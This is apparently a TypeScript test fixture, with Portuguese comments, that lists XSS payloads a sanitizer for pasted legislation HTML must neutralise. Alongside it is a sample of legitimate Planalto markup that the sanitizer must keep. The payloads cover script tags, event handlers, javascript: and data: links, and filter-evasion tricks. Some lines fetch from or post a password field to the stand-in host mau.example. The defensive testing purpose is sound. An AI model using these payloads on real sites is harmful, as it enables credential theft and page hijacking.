/**
 * Conjunto de HTML malicioso usado como critério de aceite da F0 (§17 "Segurança"):
 * o sanitizador precisa bloquear 100% destes casos.
 *
 * Cada item traz o que **não** pode sobreviver à sanitização. São vetores clássicos de XSS
 * adaptados ao caminho real do app: HTML colado de uma página de legislação.
 */
export interface Payload {
  nome: string;
  html: string;
  /** Trechos que não podem aparecer na saída (comparação sem diferenciar maiúsculas). */
  proibido: string[];
}

export const PAYLOADS: Payload[] = [
  {
    nome: "script direto",
    html: '<p>Art. 1º</p><script>alert("xss")</script>',
    proibido: ["<script", "alert("],
  },
  {
    nome: "script com atributos e quebras",
    html: '<p>Art. 1º</p><script\n type="text/javascript"\n>fetch("http://mau.example")</script>',
    proibido: ["<script", "fetch("],
  },
  {
    nome: "manipulador inline em elemento permitido",
    html: '<p onclick="roubar()" onmouseover="roubar()">Art. 2º</p>',
    proibido: ["onclick", "onmouseover", "roubar"],
  },
  {
    nome: "imagem com onerror",
    html: '<img src="x" onerror="alert(1)">',
    proibido: ["<img", "onerror", "alert"],
  },
  {
    nome: "link javascript:",
    html: '<a href="javascript:alert(1)">Lei nº 1</a>',
    proibido: ["javascript:"],
  },
  {
    nome: "link data: com html",
    html: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">nota</a>',
    proibido: ["data:text/html"],
  },
  {
    nome: "iframe",
    html: '<p>Art. 3º</p><iframe src="http://mau.example"></iframe>',
    proibido: ["<iframe", "mau.example"],
  },
  {
    nome: "objeto e embed",
    html: '<object data="mau.swf"></object><embed src="mau.swf">',
    proibido: ["<object", "<embed", "mau.swf"],
  },
  {
    nome: "svg com script",
    html: "<svg><script>alert(1)</script></svg>",
    proibido: ["<svg", "<script", "alert"],
  },
  {
    nome: "svg com onload",
    html: '<svg onload="alert(1)"><circle r="5"/></svg>',
    proibido: ["<svg", "onload", "alert"],
  },
  {
    nome: "style com expressão e importação",
    html: '<style>@import "http://mau.example/x.css"; p{background:url(javascript:alert(1))}</style><p>Art. 4º</p>',
    proibido: ["<style", "@import", "javascript:", "mau.example"],
  },
  {
    nome: "form com ação externa",
    html: '<form action="http://mau.example"><input name="senha"><button>enviar</button></form>',
    proibido: ["<form", "<input", "<button", "mau.example"],
  },
  {
    nome: "meta refresh",
    html: '<meta http-equiv="refresh" content="0;url=http://mau.example">',
    proibido: ["<meta", "refresh", "mau.example"],
  },
  {
    nome: "base para sequestrar links relativos",
    html: '<base href="http://mau.example/"><a href="/lei">Lei</a>',
    proibido: ["<base", "mau.example"],
  },
  {
    nome: "tag quebrada para escapar do filtro",
    html: "<scr<script>ipt>alert(1)</scr</script>ipt>",
    // O resto vira texto inerte ("ipt>alert(1)ipt>"): o app guarda texto, nunca marcação.
    proibido: ["<script>"],
  },
  {
    nome: "entidades codificando javascript:",
    html: '<a href="&#106;avascript:alert(1)">art. 5º</a>',
    proibido: ["javascript:"],
  },
  {
    nome: "mutação por comentário condicional",
    html: "<!--[if IE]><script>alert(1)</script><![endif]--><p>Art. 6º</p>",
    proibido: ["<script", "alert(1)"],
  },
  {
    nome: "atributo style com posicionamento para cobrir a tela",
    html: '<p style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99999">Art. 7º</p>',
    proibido: ["position:fixed"],
  },
  {
    nome: "srcdoc em iframe",
    html: '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
    proibido: ["<iframe", "srcdoc"],
  },
  {
    nome: "template com script dentro",
    html: "<template><script>alert(1)</script></template><p>Art. 8º</p>",
    proibido: ["<template", "<script", "alert(1)"],
  },
];

/** HTML legítimo do Planalto: o sanitizador precisa **preservar** isto (§18: "sanitização quebrar estrutura útil"). */
export const HTML_LEGITIMO = `
<p>Art. 9º  Este é o texto vigente do artigo.</p>
<p><s>Art. 9º  Esta é a redação anterior.</s>
<a href="https://www.planalto.gov.br/lei123">(Redação dada pela Lei nº 123, de 2020)</a></p>
<p>Art. 10.  Texto com <strong>ênfase</strong> e <em>itálico</em>.<br>Segunda linha do mesmo bloco.</p>
<p><span style="text-decoration: line-through;">Art. 11.  Revogado.</span></p>
`;
